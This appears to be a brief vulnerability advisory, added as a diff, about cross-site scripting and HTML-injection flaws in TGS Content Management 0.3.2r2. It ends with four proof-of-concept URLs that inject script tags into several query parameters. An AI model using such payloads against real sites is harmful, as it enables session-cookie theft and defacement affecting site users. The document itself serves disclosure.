@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/30157/info
+
+TGS Content Management is prone to an HTML-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user; other attacks are also possible.
+
+TGS Content Management 0.3.2r2 is vulnerable; other versions may also be affected.
+
+http://www.example.com/cms/index.php?site=account&goodmsg=>">/><script>alert(/xs/)</script>
+http://www.example.com/cms/index.php?site=filemanager&msg=>">/><script>alert(/xs/)</script>
+http://www.example.com/cms/index.php?site=filemanager&dir=>">/><script>alert(/xs/)</script>
+http://www.example.com/cms/index.php?site=usermanager&option=show&id=>">/><script>alert(/xs/)</script>
